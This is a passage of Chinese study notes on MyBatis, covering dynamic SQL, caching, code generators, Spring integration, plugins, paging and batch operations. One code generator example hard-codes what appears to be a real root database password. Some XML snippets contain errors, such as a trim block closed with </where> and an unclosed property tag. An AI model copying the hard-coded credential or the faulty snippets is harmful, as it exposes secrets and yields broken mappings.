...\n</select>\n```\n对应以上xml文件，会报错，因为select语句中的resultMap映射不正确，mybatis会找不到`com.atguigu.mybatis.EmpMapper.MyEmp`。使用resultMap映射时，该值应该是resultMap标签的id值。所以正确书写如下:\n```xml\n<resultMap type=\"com.atguigu.mybatis.bean.Emp\" id=\"MyEmp\">\n    ...\n</resultMap>\n\n<select id=\"getEmpById\" resultMap=\"MyEmp\">\n   ...\n</select>\n```\n\n\n\n### Mybatis返回对象中包含多个List属性\n数据库数据\n```sql\nmysql> select * from ai_user;\n+----+-----------+--------+\n| id | user_name | status |\n+----+-----------+--------+\n|  1 | Answer    |      1 |\n|  2 | Iris      |      1 |\n+----+-----------+--------+\n\nmysql> select * from ai_name;\n+---------+-----------+\n| user_id | user_name |\n+---------+-----------+\n|       1 | Answer    |\n|       1 | AI        |\n|       1 | AAL       |\n|       2 | Iris      |\n|       2 | Ellis     |\n|       2 | Monta     |\n+---------+-----------+\n\nmysql> select * from ai_role;\n+---------+-----------------+\n| user_id | role_name       |\n+---------+-----------------+\n|       1 | Admin           |\n|       1 | Manager         |\n|       1 | Coder           |\n|       2 | CustomerService |\n+---------+-----------------+\n```\n\n实体类\n```java\n@Data\npublic class User {\n    private Long id;\n    private List<String> names;\n    private List<String> roles;\n}\n```\n\nMapper 层\n```java\npublic interface UserMapper {\n    List<User> queryUsers();\n}\n```\n\nMapper Sql 映射文件\n```xml\n<resultMap id=\"UserMap\" type=\"User\">\n   <result column=\"id\" property=\"id\" jdbcType=\"BIGINT\" />\n    <collection property=\"names\" resultMap=\"NamesMap\" />\n    <collection property=\"roles\" resultMap=\"RolesMap\" />\n</resultMap>\n\n<resultMap id=\"NamesMap\" type=\"string\">\n    <result column=\"user_name\" />\n</resultMap>\n\n<resultMap id=\"RolesMap\" type=\"string\">\n    <result column=\"role_name\" />\n</resultMap>\n\n<select id=\"queryUsers\" resultMap=\"UserMap\">\n\tSELECT au.id, an.user_name, ar.role_name\n    FROM ai_user au\n    LEFT JOIN ai_name an ON an.user_id = au.id\n    LEFT JOIN ai_role ar ON ar.user_id = au.id\n</select>\n```\n\n结果输出示例\n```txt\n{\"id\":1,\"names\":[\"Answer\",\"AI\",\"AAL\"],\"roles\":[\"Admin\",\"Manager\",\"Coder\"]}\n{\"id\":2,\"names\":[\"Iris\",\"Ellis\",\"Monta\"],\"roles\":[\"CustomerService\"]}\n```\n\n# resultType对应的类中必须要有无参构造方法以及get/set方法\nmybatis的返回值的封装方式是先构造一个无参的对象，然后通过set方法一个一个的往里面set值，所以如果不提供无参构造方法，就会报错，同样的，针对需要的属性值也**必须提供get/set方法。**\n\t\n# 动态SQL\n动态 SQL是MyBatis强大特性之一。极大的简化我们拼装SQL的操作。\n动态 SQL 元素和使用 JSTL 或其他类似基于 XML 的文本处理器相似。\nMyBatis 采用功能强大的基于 OGNL 的表达式来简化操作。\n\n## if，where\n```xml\n<select id=\"getEmpWhereIf\" resultType=\"com.atguigu.bean.Employee\">\n\tselect * from employee where 1=1\n\t<if test =\"id!=null\">\n\t\tand id=#{id}\n\t</if>\n\t<if test=\"lastName!=null and lastName != ''\">\n\t\tand lastName= #{lastName}\n\t</if>\n\t<if test = \"gender==0 or gender==1\">\n\t\tgender = #{gender}\n\t</if>\n</select>\n```\n上面写where 1=1 的原因是为了防止出现id==null时，其sql语句为where and ....\n解决这个问题，我们除了可以使用添加1=1的方法，我们还可以使用\\<where>标签\n\\<where>的作用：添加where关键字，同时去掉多余的and\n```xml\n<select id=\"getEmpWhereIf\" resultType=\"com.atguigu.bean.Employee\">\n\tselect * from employee\n\t<where>\n\t\t<if test =\"id!=null\">\n\t\t\tand id=#{id}\n\t\t</if>\n\t\t<if test=\"lastName!=null and lastName != ''\">\n\t\t\tand lastName= #{lastName}\n\t\t</if>\n\t\t<if test = \"gender==0 or gender==1\">\n\t\t\tgender = #{gender}\n\t\t</if>\n\t</where>\n</select>\n```\n\n## trim\n`trim prefix=\"\" suffix=\"\" prefixOverrides=\"\" suffixOverrides=\"\">`: 截取并拼接\nprefix: 在操作的sql语句前加入某些内容\nsuffix: 在操作的sql语句后加入某些内容\nprefixOverrides: 在操作的sql语句前的某些内容去掉\nsuffixOverrides: 在操作的sql语句后的某些内容去掉\n```xml\n<select id=\"getEmpWhereIf\" resultType=\"com.atguigu.bean.Employee\">\n\tselect * from employee\n\t<trim prefix=\"where\" suffixOverrides=\"and|or\">\n\t\t<if test =\"id!=null\">\n\t\t\tid=#{id} and\n\t\t</if>\n\t\t<if test=\"lastName!=null and lastName != ''\">\n\t\t\tlastName= #{lastName} or\n\t\t</if>\n\t\t<if test = \"gender==0 or gender==1\">\n\t\t\tgender = #{gender}\n\t\t</if>\n\t</where>\n</select>\n```\n\n## set\nset的主要用于解决修改操作中sql语句中可能出现逗号的问题\n```xml\n<update id=\"updateEmpByConditionSet\">\n\tupdate employee\n\t<set>\n\t\t<if test=\"lastName!=null &amp;&amp; lastName!=&quot;&quot;\">\n\t\t\tlastName=#{lastName},\n\t\t</if>\n\t\t<if test=\"email!=null and email.trim()!=''\">\n\t\t\temail=#{email}\n\t\t</if>\n\t</set>\n\twhere id = #{id}\n</update>\n```\n\n## choose（when, otherwise）\nchose主要用于分支判断，类似于java中的switch case, 只会满足所有分支中的一个\n```xml\n<insert id=\"insertEmp\">\n\tinsert into emp values(\n\t\tnull,\n\t\t#{ename},\n\t\t#{age},\n\t\t<choose> <!-- 选择某一个when或otherwise拼接SQL -->\n\t\t\t<when test=\"sex==0\">'女'</when>\n\t\t\t<when test=\"sex==1\">'男'</when>\n\t\t\t<otherwise>'不详'</otherwise><!-- 当when都不符合条件，就会选择otherwise拼接SQL -->\n\t\t</choose>\n\t)\n</insert>\n```\n\n## foreach\n`<foreach collection=\"\" item=\"\" close=\"\" open=\"\" separator=\"\" index=\"\"></foreach>`：对一个数组或集合进行遍历\ncollection: 指定要遍历的集合或数组\nitem: 设置别名\nclose: 设置循环体的结束内容\nopen: 设置循环体的开始内容\nseparator: 设置每一次循环之间的分隔符\nindex: 若遍历的时list, index代表下标。 若遍历的是map, index代表键\n\n```java\nvoid deleteMoreByList(List<Integer> eids);\n```\n\n<span id=\"one\"></span>\n```xml\n<delete id=\"deleteMoreByList\">\n\tdelete from emp where eid in\n\t<!-- 注意collection的值是list，而不是eids， 因为当传输参数为List时，mybatis将其放在map中，且以list为键 -->\n\t<foreach collection=\"list\" item=\"eid\" separator=\",\" open=\"(\" close=\")\">\n\t\t#{eid}\n\t</foreach>\n</delete>\n```\n> jdbc默认是不能一次执行多条sql语句；如果想要一次执行多条sql语句，则可以在链接地址url后添加参数？allowMultiQueries=true\n\n## sql片段\n`<sql  id=\"\"></sql>`: 设置一段sql片段，即公共sql，可以被当前映射文件中所有的sql语句所访问\n`<include refid=\"\"></include>`: 访问某个sql片段\n```xml\n<sql id=\"empColumns\">select eid, ename, age, sex, did from emp</sql>\n\n<select id=\"getEmpListByMoreTJ\" resultType=\"Emp\">\n\t<include refid=\"empColumns\"></include>\n</select>\n```\n\n# MyBatis缓存机制\nMyBatis 包含一个非常强大的查询缓存特性,它可以非常方便地配置和定制。缓存可以极大的提升查询效率。\nMyBatis系统中默认定义了两级缓存。\n一级缓存和二级缓存。\n- 默认情况下，只有一级缓存（SqlSession级别的缓存，也称为本地缓存）开启。\n- 二级缓存需要手动开启和配置，他是基于namespace级别的缓存。\n- 为了提高扩展性。MyBatis定义了缓存接口Cache。我们可以通过实现Cache接口来自定义二级缓存\n\n## 一级缓存\n一级缓存(local cache), 即本地缓存, 作用域默认为sqlSession。当Session flush 或 close 后, 该Session 中的所有 Cache 将被清空。\n本地缓存不能被关闭, 但可以调用 clearCache() 来清空本地缓存, 或者改变缓存的作用域.\n在mybatis3.1之后, 可以配置本地缓存的作用域. 在 mybatis.xml 中配置\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124902.png)\n\n同一次会话期间只要查询过的数据都会保存在当前SqlSession的一个Map， 其中key:hashCode+查询的SqlId+编写的sql查询语句+参数\n\n**一级缓存失效的四种情况**\n- 不同的SqlSession对应不同的一级缓存\n- 同一个SqlSession但是查询条件不同\n- 同一个SqlSession两次查询期间执行了任何一次增删改操作\n- 同一个SqlSession两次查询期间手动清空了缓存\n\n## 二级缓存\n二级缓存(second level cache)，全局作用域缓存\n二级缓存默认不开启，需要手动配置\nMyBatis提供二级缓存的接口以及实现，缓存实现要求POJO实现Serializable接口\n<font color=\"red\">二级缓存在 SqlSession 关闭或提交之后才会生效</font>\n\n**二级缓存开启步骤**\n- 全局配置文件中开启二级缓存\n```xml\n<setting name=\"cacheEnabled\" value=\"true\"/>\n```\n- 需要使用二级缓存的映射文件处使用cache配置缓存\n```xml\n<cache />\n```\n- 注意：POJO需要实现Serializable接口\n\n**二级缓存相关属性**\neviction=“FIFO”：缓存回收策略：\n- LRU – 最近最少使用的：移除最长时间不被使用的对象。\n- FIFO – 先进先出：按对象进入缓存的顺序来移除它们。\n- SOFT – 软引用：移除基于垃圾回收器状态和软引用规则的对象。\n- WEAK – 弱引用：更积极地移除基于垃圾收集器状态和弱引用规则的对象。\n- 默认的是 LRU。 \n\nflushInterval：刷新间隔，单位毫秒\n- 默认情况是不设置，也就是没有刷新间隔，缓存仅仅调用语句时刷新\n\nsize：引用数目，正整数\n- 代表缓存最多可以存储多少个对象，太大容易导致内存溢出\n\nreadOnly：只读，true/false\n- true：只读缓存；会给所有调用者返回缓存对象的相同实例。因此这些对象不能被修改。这提供了很重要的性能优势。\n- false：读写缓存；会返回缓存对象的拷贝（通过序列化）。这会慢一些，但是安全，因此默认是 false。\n\n**缓存的相关属性设置**\n- 全局setting的cacheEnable： 配置二级缓存的开关。一级缓存一直是打开的。 \n- select标签的useCache属性：配置这个select是否使用二级缓存。一级缓存一直是使用的 • 3、sql标签的flushCache属性：\n- 增删改默认flushCache=true。sql执行以后，会同时清空一级和二级缓存。查询默认flushCache=false。 \n- sqlSession.clearCache()： – 只是用来清除一级缓存。 • 5、当在某一个作用域 (一级缓存Session/二级缓存Namespaces) 进行了 C/U/D 操作后，默认该作用域下所 有 select 中的缓存将被clear\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124917.png)\n\n## 第三方缓存整合\nEhCache 是一个纯Java的进程内缓存框架，具有快速、精干等特点，是Hibernate中默认的CacheProvider。\nMyBatis定义了Cache接口方便我们进行自定义扩展。\n**使用EhCache的步骤**\n1. 导入ehcache包，以及整合包，日志包\nehcache-core-2.6.8.jar、mybatis-ehcache-1.0.3.jar\nslf4j-api-1.6.1.jar、slf4j-log4j12-1.6.2.jar\n2. 编写ehcache.xml配置文件\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<ehcache xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n xsi:noNamespaceSchemaLocation=\"../config/ehcache.xsd\">\n <!-- 磁盘保存路径 -->\n <diskStore path=\"D:\\44\\ehcache\" />\n \n <defaultCache \n   maxElementsInMemory=\"1\" \n   maxElementsOnDisk=\"10000000\"\n   eternal=\"false\" \n   overflowToDisk=\"true\" \n   timeToIdleSeconds=\"120\"\n   timeToLiveSeconds=\"120\" \n   diskExpiryThreadIntervalSeconds=\"120\"\n   memoryStoreEvictionPolicy=\"LRU\">\n </defaultCache>\n</ehcache>\n \n<!-- \n属性说明：\nl diskStore：指定数据在磁盘中的存储位置。\nl defaultCache：当借助CacheManager.add(\"demoCache\")创建Cache时，EhCache便会采用<defalutCache/>指定的的管理策略\n \n以下属性是必须的：\nl maxElementsInMemory - 在内存中缓存的element的最大数目 \nl maxElementsOnDisk - 在磁盘上缓存的element的最大数目，若是0表示无穷大\nl eternal - 设定缓存的elements是否永远不过期。如果为true，则缓存的数据始终有效，如果为false那么还要根据timeToIdleSeconds，timeToLiveSeconds判断\nl overflowToDisk - 设定当内存缓存溢出的时候是否将过期的element缓存到磁盘上\n \n以下属性是可选的：\nl timeToIdleSeconds - 当缓存在EhCache中的数据前后两次访问的时间超过timeToIdleSeconds的属性取值时，这些数据便会删除，默认值是0,也就是可闲置时间无穷大\nl timeToLiveSeconds - 缓存element的有效生命期，默认是0.,也就是element存活时间无穷大\n diskSpoolBufferSizeMB 这个参数设置DiskStore(磁盘缓存)的缓存区大小.默认是30MB.每个Cache都应该有自己的一个缓冲区.\nl diskPersistent - 在VM重启的时候是否启用磁盘保存EhCache中的数据，默认是false。\nl diskExpiryThreadIntervalSeconds - 磁盘缓存的清理线程运行间隔，默认是120秒。每个120s，相应的线程会进行一次EhCache中数据的清理工作\nl memoryStoreEvictionPolicy - 当内存缓存达到最大，有新的element加入的时候， 移除缓存中element的策略。默认是LRU（最近最少使用），可选的有LFU（最不常使用）和FIFO（先进先出）\n -->\n```\n3. 配置cache标签`<cache type=\"org.mybatis.caches.ehcache.EhcacheCache\"></cache>`\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124929.png)\n\n# MyBatis-逆向工程\nMyBatis Generator： • 简称MBG，是一个专门为MyBatis框架使用者定制的代码生成器，可以快速的根据表生成对应的映射文件，接口，以及bean类。支持基本的增删改查，以及QBC风格的条件查询。但是表连接、存储过程等这些复杂sql的定义需要我们手工编写\n\n## MBG使用\n**使用步骤：**\n- 编写MBG的配置文件（重要几处配置）\n  - jdbcConnection配置数据库连接信息\n  - javaModelGenerator配置javaBean的生成策略\n  - sqlMapGenerator 配置sql映射文件生成策略\n  - javaClientGenerator配置Mapper接口的生成策略\n  - table 配置要逆向解析的数据表\n\t- tableName：表名\n    - domainObjectName：对应的javaBean名 \n- 运行代码生成器生成代码\n\n**注意：**\nContext标签\ntargetRuntime=“MyBatis3“可以生成带条件的增删改查\ntargetRuntime=“MyBatis3Simple“可以生成基本的增删改查\n如果再次生成，建议将之前生成的数据删除，避免xml向后追加内容出现的问题。\n\n**MBG配置文件**\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE generatorConfiguration\n  PUBLIC \"-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\"\n  \"http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\">\n\n<generatorConfiguration>\n\t<context id=\"DB2Tables\" targetRuntime=\"MyBatis3\">\n\t\t<!--数据库连接信息配置  -->\n\t\t<jdbcConnection driverClass=\"com.mysql.jdbc.Driver\" connectionURL=\"jdbc:mysql://localhost:3306/bookstore0629\" userId=\"root\" password=\"123456\"></jdbcConnection>\n\n\t\t<!-- javaBean的生成策略 -->\n\t\t<javaModelGenerator targetPackage=\"com.atguigu.bean\" targetProject=\".\\src\"> <property name=\"enableSubPackages\" value=\"true\" />\n\t\t\t<property name=\"trimStrings\" value=\"true\" />\n\t\t</javaModelGenerator>\n\n\t\t<!-- 映射文件的生成策略 -->\n\t\t<sqlMapGenerator targetPackage=\"mybatis.mapper\" targetProject=\".\\conf\"> <property name=\"enableSubPackages\" value=\"true\" /></sqlMapGenerator>\n\n\t\t<!-- dao接口java文件的生成策略 -->\n\t\t<javaClientGenerator type=\"XMLMAPPER\" targetPackage=\"com.atguigu.dao\" targetProject=\".\\src\">\n\t\t\t<property name=\"enableSubPackages\" value=\"true\" />\n\t\t</javaClientGenerator>\n\n\t\t<!-- 数据表与javaBean的映射 -->\n\t\t<table tableName=\"books\" domainObjectName=\"Book\"></table>\n\t</context>\n</generatorConfiguration>\n```\n\n**生成器代码**\n```java\npublic static void main(String[] args) throws Exception {\n\tList<String> warnings = new ArrayList<String>();\n\tboolean overwrite = true;\n\tFile configFile = new File(\"mbg.xml\");\n\tConfigurationParser cp = new ConfigurationParser(warnings);\n\tConfiguration config = cp.parseConfiguration(configFile);\n\tDefaultShellCallback callback = new DefaultShellCallback(overwrite);\n\tMyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings);\n\tmyBatisGenerator.generate(null);\n}\n```\n\n**测试查询：**\nQBC风格的带条件查询\n```java\n@Test\npublic void test01(){\n\tSqlSession openSession = build.openSession();\n\tDeptMapper mapper = openSession.getMapper(DeptMapper.class);\n\tDeptExample example = new DeptExample();\n\t//所有的条件都在example中封装\n\tCriteria criteria = example.createCriteria();\n\t//select id, deptName, locAdd from tbl_dept WHERE \n\t//( deptName like ? and id > ? ) \n\tcriteria.andDeptnameLike(\"%部%\");\n\tcriteria.andIdGreaterThan(2);\n\tList<Dept> list = mapper.selectByExample(example);\n\tfor (Dept dept : list) {\n\t\tSystem.out.println(dept);\n\t}\n}\n```\n\n**MyBatis-工作原理**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124940.png)\n\n## 通过Mybatis-plus的代码生成器\n[官网](https://mp.baomidou.com/guide/generator.html#%E6%B7%BB%E5%8A%A0%E4%BE%9D%E8%B5%96)\n**通过Mybatis-plus的三个步骤**\n- 引入依赖\n```xml\n<!-- web依赖  -->\n<dependency>\n\t<groupId>org.springframework.boot</groupId>\n\t<artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n<!-- mysql依赖  -->\n<dependency>\n\t<groupId>mysql</groupId>\n\t<artifactId>mysql-connector-java</artifactId>\n\t<scope>runtime</scope>\n</dependency>\n<!-- mybatis-plus依赖   -->\n<dependency>\n\t<groupId>com.baomidou</groupId>\n\t<artifactId>mybatis-plus-boot-starter</artifactId>\n\t<version>3.3.1</version>\n</dependency>\n<!-- mybatis-plus代码生成器依赖  -->\n<dependency>\n\t<groupId>com.baomidou</groupId>\n\t<artifactId>mybatis-plus-generator</artifactId>\n\t<version>3.3.1</version>\n</dependency>\n<!-- mybatis-plus代码生成器模板引擎依赖   -->\n<dependency>\n\t<groupId>org.freemarker</groupId>\n\t<artifactId>freemarker</artifactId>\n\t<version>2.3.31</version>\n</dependency>\n```\n- **编写主程序**\n```java\npublic class CodeGenerator {\n\t/**\n\t * <p>\n\t * 读取控制台内容\n\t * </p>\n\t */\n\tpublic static String scanner(String tip) {\n\t\tScanner scanner = new Scanner(System.in);\n\t\tStringBuilder help = new StringBuilder();\n\t\thelp.append(\"请输入\" + tip + \"：\");\n\t\tSystem.out.println(help.toString());\n\t\tif (scanner.hasNext()) {\n\t\t\tString ipt = scanner.next();\n\t\t\tif (StringUtils.isNotBlank(ipt)) {\n\t\t\t\treturn ipt;\n\t\t\t}\n\t\t}\n\t\tthrow new MybatisPlusException(\"请输入正确的\" + tip + \"！\");\n\t}\n\n\tpublic static void main(String[] args) {\n\t\t// 代码生成器\n\t\tAutoGenerator mpg = new AutoGenerator();\n\n\t\t// 全局配置\n\t\tGlobalConfig gc = new GlobalConfig();\n\t\tString projectPath = System.getProperty(\"user.dir\");\n\t\tgc.setOutputDir(projectPath + \"/yeb-generator/src/main/java\");\n\t\t// 设置作者名字\n\t\tgc.setAuthor(\"whz\");\n\t\t// 是否打开输出目录\n\t\tgc.setOpen(false);\n\t\t// xml开启BaseResultMap\n\t\tgc.setBaseResultMap(true);\n\t\t// xml开启BaseColumnList\n\t\tgc.setBaseColumnList(true);\n\t\t// 实体属性 Swagger2 注解\n\t\tgc.setSwagger2(true);\n\t\tmpg.setGlobalConfig(gc);\n\n\t\t// 数据源配置\n\t\tDataSourceConfig dsc = new DataSourceConfig();\n\t\tdsc.setUrl(\"jdbc:mysql://localhost:3306/yeb?useUnicode=true&useSSL=false&characterEncoding=utf8&serverTimezone=Asia/Shanghai\");\n\t\tdsc.setDriverName(\"com.mysql.jdbc.Driver\");\n\t\tdsc.setUsername(\"root\");\n\t\tdsc.setPassword(\"whz1152957995\");\n\t\tmpg.setDataSource(dsc);\n\n\t\t// 包配置\n\t\tPackageConfig pc = new PackageConfig();\n\t\tpc.setParent(\"com.example\")\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t.setEntity(\"pojo\")\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t.setMapper(\"mapper\")\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t.setService(\"service\")\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t.setServiceImpl(\"service.impl\")\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t.setController(\"controller\");\n\t\tmpg.setPackageInfo(pc);\n\n\t\t// 自定义配置\n\t\tInjectionConfig cfg = new InjectionConfig() {\n\t\t\t@Override\n\t\t\tpublic void initMap() {\n\t\t\t\t// to do nothing\n\t\t\t}\n\t\t};\n\n\t\t// 如果模板引擎是 freemarker\n\t\tString templatePath = \"/templates/mapper.xml.ftl\";\n\t\t// 如果模板引擎是 velocity\n\t\t// String templatePath = \"/templates/mapper.xml.vm\";\n\n\t\t// 自定义输出配置\n\t\tList<FileOutConfig> focList = new ArrayList<>();\n\t\t// 自定义配置会被优先输出\n\t\tfocList.add(new FileOutConfig(templatePath) {\n\t\t\t@Override\n\t\t\tpublic String outputFile(TableInfo tableInfo) {\n\t\t\t\t// 自定义输出文件名 ， 如果你 Entity 设置了前后缀、此处注意 xml 的名称会跟着发生变化！！\n\t\t\t\treturn projectPath + \"/yeb-generator/src/main/resources/mapper/\" + tableInfo.getEntityName() + \"Mapper\" + StringPool.DOT_XML;\n\t\t\t}\n\t\t});\n        /*\n        cfg.setFileCreate(new IFileCreate() {\n            @Override\n            public boolean isCreate(ConfigBuilder configBuilder, FileType fileType, String filePath) {\n                // 判断自定义文件夹是否需要创建\n                checkDir(\"调用默认方法创建的目录，自定义目录用\");\n                if (fileType == FileType.MAPPER) {\n                    // 已经生成 mapper 文件判断存在，不想重新生成返回 false\n                    return !new File(filePath).exists();\n                }\n                // 允许生成模板文件\n                return true;\n            }\n        });\n        */\n\t\tcfg.setFileOutConfigList(focList);\n\t\tmpg.setCfg(cfg);\n\n\t\t// 配置模板\n\t\tTemplateConfig templateConfig = new TemplateConfig();\n\n\t\t// 配置自定义输出模板\n\t\t//指定自定义模板路径，注意不要带上.ftl/.vm, 会根据使用的模板引擎自动识别\n\t\t// templateConfig.setEntity(\"templates/entity2.java\");\n\t\t// templateConfig.setService();\n\t\t// templateConfig.setController();\n\n\t\ttemplateConfig.setXml(null);\n\t\tmpg.setTemplate(templateConfig);\n\n\t\t// 策略配置\n\t\tStrategyConfig strategy = new StrategyConfig();\n\t\t// 数据库表映射到实体的命名策略\n\t\tstrategy.setNaming(NamingStrategy.underline_to_camel);\n\t\t// 数据库表字段映射到实体的命名策略\n\t\tstrategy.setColumnNaming(NamingStrategy.no_change);\n\t\t//Lombok模型\n\t\tstrategy.setEntityLombokModel(true);\n\t\t//生成 @RestController控制器\n\t\tstrategy.setRestControllerStyle(true);\n\t\tstrategy.setInclude(scanner(\"表名，多个英文逗号分割\").split(\",\"));\n\t\tstrategy.setControllerMappingHyphenStyle(true);\n\t\t// 表前缀\n\t\tstrategy.setTablePrefix(\"t_\");\n\t\tmpg.setStrategy(strategy);\n\t\tmpg.setTemplateEngine(new FreemarkerTemplateEngine());\n\t\tmpg.execute();\n\t}\n}\n```\n- **运行程序，输入要生成的表明**\n运行程序结果如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124950.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124959.png)\n\n# MyBatis-Spring整合\n```xml\n<bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\">\n\t<!-- 指定mybatis全局配置文件位置 --> \n\t<property name=\"configLocation\" value=\"classpath:mybatis/mybatis-config.xml\"></property>\n\t<!--指定数据源 --> \n\t<property name=\"dataSource\" ref=\"dataSource\"></property>\n\t<!--mapperLocations：所有sql映射文件所在的位置 -->\n\t<property name=\"mapperLocations\" value=\"classpath:mybatis/mapper/*.xml\"></property>\n\t<!--typeAliasesPackage：批量别名处理-->\n\t<property name=\"typeAliasesPackage\" value=\"com.atguigu.bean\"></property>\n</bean>\n\n<!--自动的扫描所有的mapper的实现并加入到ioc容器中 -->\n<bean id=\"configure\" class=\"org.mybatis.spring.mapper.MapperScannerConfigurer\">\n\t<!– basePackage:指定包下所有的mapper接口实现自动扫描并加入到ioc容器中 -->\n\t<property name=\"basePackage\" value=\"com.atguigu.dao\"></property>\n</bean>\n```\n\n# MyBatis-工作原理\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125008.png)\n\n# MyBatis-插件开发\nMyBatis在四大对象的创建过程中，都会有插件进行介入。插件可以利用动态代理机制一层层的包装目标对象，而实现在目标对象执行目标方法之前进行拦截的效果。\nMyBatis 允许在已映射语句执行过程中的某一点进行拦截调用。\n默认情况下，MyBatis 允许使用插件来拦截的方法调用包括：\n- Executor (update, query, flushStatements, commit, rollback, getTransaction, close, isClosed) \n- ParameterHandler (getParameterObject, setParameters) \n- ResultSetHandler (handleResultSets, handleOutputParameters) \n- StatementHandler (prepare, parameterize, batch, update, query)\n\n## 插件开发步骤\n1. 编写插件实现Interceptor接口， 并使用@Intercepts注解完成插件签名\n```java\n@Intercepts({@Signature(type=StatementHandler.class, method=\"prepare\", args={Connection.class})})\npublic class MyFirstPlugin implements Interceptor{}\n```\n2. 在全局配置文件中注册插件\n```xml\n<plugins>\n\t<plugin interceptor=\"com.atguigu.plugin.MyFirstPlugin\">\n\t\t<property name=\"username\" value=\"tomcat\"/>\n\t</plugin>\n</plugins>\n```\n\n## 插件原理\n按照插件注解声明，按照插件配置顺序调用插件plugin方法，生成被拦截对象的动态代理\n多个插件依次生成目标对象的代理对象，层层包裹，先声明的先包裹；形成代理链\n目标方法执行时依次从外到内执行插件的intercept方法。 \n多个插件情况下，我们往往需要在某个插件中分离出目标对象。可以借助MyBatis提供的SystemMetaObject类来进行获取最后一层的h以及target属性的值\n\n**Interceptor接口(与spring中的拦截器区分开)**\n该接口中的三个方法\n- Intercept：拦截目标方法执行\n- plugin：生成动态代理对象，可以使用MyBatis提 供的Plugin类的wrap方法\n- setProperties：注入插件配置时设置的属性\n\n**常用代码**\n从代理链中分离真实被代理对象\n```java\n//1、分离代理对象。由于会形成多次代理，所以需要通过一个while 循环分离出最终被代理对象，从而方便提取信息\nMetaObject metaObject = SystemMetaObject.forObject(target);\nwhile (metaObject.hasGetter(\"h\")) {\n\tObject h = metaObject.getValue(\"h\");\n\tmetaObject = SystemMetaObject.forObject(h);\n}\n//2、获取到代理对象中包含的被代理的真实对象\nObject obj = metaObject.getValue(\"target\");\n//3、获取被代理对象的MetaObject方便进行信息提取\nMetaObject forObject = SystemMetaObject.forObject(obj);\n```\n\n# 扩展：MyBatis实用场景\n## PageHelper插件进行分页\nPageHelper是MyBatis中非常方便的第三方分页插件\n**使用步骤**\n1. 导入相关包pagehelper-x.x.x.jar 和 jsqlparser-0.9.5.jar。 \n2. 在MyBatis全局配置文件中配置分页插件。 \n```xml\n<plugins>\n\t<plugin interceptor=\"com.github.pagehelper.PageInterceptor\">\n\t\t<!-- 使用下面方式配置参数，后面会有所有的参数介绍 -->\n\t\t<property name=\"param1\" value=\"value1\">\n\t</plugin>\n</plugins>\n```\n3. 使用PageHelper提供的方法进行分页\n```java\n//在查询之前只需要调用PageHelper.startPage, 其中第一个参数为页码， 第二个参数为每页的大小\nPageHelper.startPage(1, 10);\n//startPage后面紧跟的查询就是一个经过PageHelper处理的分页查询\nList<Employee> emps = employeeService.getAll();\n\n//将得到的emps使用pageInfo包装, 包装后，封装了详细的分页信息\nPageInfo page = new PageInfo(emps);\n```\n[详细使用](https://github.com/pagehelper/Mybatis-PageHelper/blob/master/wikis/en/HowToUse.md)\n\n4. 可以使用更强大的PageInfo封装返回结果\n\n\n## 批量操作\n默认的 openSession() 方法没有参数,它会创建有如下特性的\n- 会开启一个事务(也就是不自动提交) – 连接对象会从由活动环境配置的数据源实例得到。\n- 事务隔离级别将会使用驱动或数据源的默认设置。\n- 预处理语句不会被复用,也不会批量处理更新。\n\nopenSession 方法的ExecutorType类型的参数，枚举类型:\n- ExecutorType.SIMPLE: 这个执行器类型不做特殊的事情（这是默认装配的）。它为每个语句的执行创建一个新的预处理语句。\n- ExecutorType.REUSE: 这个执行器类型会复用预处理语句。\n- ExecutorType.BATCH: 这个执行器会批量执行所有更新语句\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125021.png)\n\n批量操作我们是使用MyBatis提供的BatchExecutor进行的，他的底层就是通过jdbc攒sql的方式进行的。我们可以让他攒够一定数量后发给数据库一次。\n```java\npublic void test01() {\n\tSqlSession openSession = build.openSession(ExecutorType.BATCH);\n\tUserDao mapper = openSession.getMapper(UserDao.class);\n\tlong start = System.currentTimeMillis();\n\tfor (int i = 0; i < 1000000; i++) {\n\t\tString name = UUID.randomUUID().toString().substring(0, 5);\n\t\tmapper.addUser(new User(null, name, 13));\n\t}\n\topenSession.commit();\n\topenSession.close();\n\tlong end = System.currentTimeMillis();\n\tSystem.out.println(\"耗时时间：\"+(end-start));\n}\n```\n\n**与Spring整合中，我们推荐，额外的配置一个可以专门用来执行批量操作的sqlSession**\n```xml\n<bean id=\"sqlSession\" class=\"org.mybatis.spring.SqlSessionTemplate\">\n\t<constructor-arg name=\"sqlSessionFactory\" ref=\"sqlSessionFactoryBean\"/>\n\t<constructor-arg name=\"executorType\" ref=\"BATCH\"/>\n</bean>\n```\n需要用到批量操作的时候，我们可以注入配置的这个批量SqlSession。通过他获取到mapper映射器进行操作。\n注意：\n- 批量操作是在session.commit()以后才发送sql语句给数据库进行执行的\n- 如果我们想让其提前执行，以方便后续可能的查询操作获取数据，我们可以使用sqlSession.flushStatements()方法，让其直接冲刷到数据库进行执行。\n\n\n# Mybatis注解开发\n**增删改查相关注解**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125030.png)\n\n**结果集映射相关注解**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409125043.png)\n\n## 示例\n**表结构**\n```sql\n/**商品信息*/\ncreate table productinfo(\n       id int primary key auto_increment, --主键\n       proName varchar(50),--商品名称\n       proNo  varchar(50), 